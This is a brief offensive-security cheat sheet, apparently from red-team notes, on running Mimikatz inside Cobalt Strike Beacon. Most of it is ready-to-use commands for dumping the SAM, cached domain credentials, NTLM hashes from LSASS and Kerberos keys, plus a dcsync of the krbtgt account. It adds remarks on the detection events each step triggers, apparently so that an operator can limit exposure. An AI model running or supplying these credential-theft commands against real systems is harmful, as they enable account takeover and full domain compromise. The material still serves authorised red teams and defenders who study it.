# MimiKatz



## Cobalt Strike + MimiKatz

Cobalt Strike's built in Mimikatz executes each new mimikatz command in a new temporary process, which is then destroyed after it finishes. Because of this, we will need to chain our mimikatz commands.

```powershell
beacon> mimikatz token::elevate ; lsadump::sam
```

### Modifier Keys

#### !

In most cases, `!` is a direct replacement for `token::elevate`. For example:

```
beacon> mimikatz !lsadump::sam
```

#### @

The `@` impersonates Beacon's thread token before running the given command, which is useful in cases where Mimikatz needs to interact with a remote system, such as with dcsync.

```
beacon> mimikatz @lsadump::dcsync /user:DEV\krbtgt
```



### Dumping Security Account Manager (SAM)

```powershell
beacon> mimikatz !lsadump::sam
```

<mark style="color:red;">**Note**</mark>: This opens a handle to the SAM registry Hive. "Suspicious SAM Hive Handle".

### Dumping Cached Domain Credentials (DCC)

```powershell
beacon> mimikatz !lsadump::cache
```

We can crack the hashes with [hashcat](https://github.com/hashcat/hashcat). Example hashes can be found [here](https://hashcat.net/wiki/doku.php?id=example\_hashes).

<mark style="color:red;">**Note**</mark>: This handle to the SECURITY registry hive. Use the "Suspicious SECURITY Hive Handle".

###

### Dumping NTLM Hashes

```powershell
beacon> mimikatz !sekurlsa::logonpasswords
```

<mark style="color:red;">**Note**</mark>: Mimikatz's **logonpasswords** module will open a read handle to LSASS, which is logged under the winevent 4656. "Suspicious Handle to LSASS". Use this cautiously, and only if needed.

### Dumping Kerberos Encryption Keys

```powershell
beacon> mimikatz !sekurlsa::ekeys
```

<mark style="color:red;">**Note**</mark>: This module also opens a read handle to LSASS.
